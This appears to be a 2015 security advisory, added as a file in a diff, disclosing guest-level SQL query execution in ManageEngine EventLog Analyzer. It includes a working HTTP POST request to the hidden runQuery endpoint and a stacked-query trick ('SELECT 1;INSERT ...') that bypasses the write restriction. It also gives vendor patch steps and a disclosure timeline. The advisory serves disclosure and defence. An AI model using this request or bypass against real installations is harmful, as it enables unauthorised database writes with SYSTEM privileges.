@@ -1,0 +1,92 @@
+Exploit Title: ManageEngine EventLog Analyzer SQL query execution
+Product: ManageEngine EventLog Analyzer
+Vulnerable Versions: v10.6 build 10060 and previous versions
+Tested Version: v10.6 build 10060 (Windows)
+Advisory Publication: 14/09/2015
+Vulnerability Type: authenticated SQL query execution
+Credit: xistence <xistence[at]0x90.nl>
+
+Product Description
+-------------------
+
+EventLog Analyzer carry out logs analysis for all Windows, Linux and Unix
+systems, Switches and Routers (Cisco), other Syslog supporting devices, and
+applications like IIS, MS SQL. Eventlog analyzer application is capable of
+performing real-time log file analysis. Event log files analyzer
+application can carry out log file analysis of imported files. The files
+can be imported from the archive or from any machine.
+
+When an important security event is generated on a machine in the network,
+event log file analyser application collects, performs log analysis and
+displays the event on the EventLog Analyzer Dashboard, in real-time. The
+event log report is generated from the analyzed event logs. From the event
+log reports (graphs), you can drill down to the raw log events and do a
+root cause analysis within minutes, and then focus on resolving it.
+
+The logging analyser application carry out imported and archived log files
+analyses to fulfill the requirements of forensic analysis and event log
+audit. The forensic and audit reports can be generated from the analyzed
+logs.
+
+
+Vulnerability Details
+---------------------
+
+Every user has the ability to execute SQL queries through the
+"/event/runQuery.do" script, including the default "guest" user. (The SQL
+query option is just not visible in the web interface)
+Below is the POST request, executed as "guest":
+
+POST /event/runQuery.do HTTP/1.1
+Host: 192.168.2.116:8400
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=XXXXXXXXXX
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 39
+
+execute=true&query=select+version%28%29
+
+
+Access to queries starting with "INSERT" or "UPDATE" is denied by default,
+however this can be bypassed by doing a select query first, like this:
+
+"SELECT 1;INSERT INTO ..."
+
+The included Postgres backend is running with SYSTEM privileges on Windows,
+allowing to write files to disk with these privileges.
+
+A Metasploit exploit module will be released shortly.
+
+
+Solution
+--------
+ManageEngine has provided a patch to fix this issue, the steps to apply/fix
+this are as below:
+
+1. Stop the ELA service.
+2. Download the zip from
+http://bonitas2.zohocorp.com/zipUploads/2015_14_07_17_52_30_o_19q686iqs1sfemdf19e05sqre61.tar.gz
+and extract the folders. You would have two folders "EventLogAnalyzerJSP"
+and "LogAnalyzerClient"  under "o_19q686iqs1sfemdf19e05sqre61". Copy these
+two folders and place it under <ELA Home>//lib/ folder.
+3. The path of the following files would be as below:
+
+runQuery_jsp.class --> <ELA
+Home>\\lib\\EventLogAnalyzerJSP\\com\\adventnet\\sa\\jsp\\WEB_002dINF\\jsp
+RunQuery.class --> <ELA Home>\\lib\\LogAnalyzerClient\\com\\adventnet\\la\
+
+4. Restart the ELA service and check for the issue.
+
+
+Advisory Timeline
+-----------------
+
+07/11/2015 - Discovery and vendor notification
+07/13/2015 - ManageEngine acknowledged issue
+07/14/2015 - ManageEngine supplied fix
+07/16/2015 - Verified fix and replied back to ManageEngine that the issue
+has been resolved
+09/14/2015 - Public disclosure
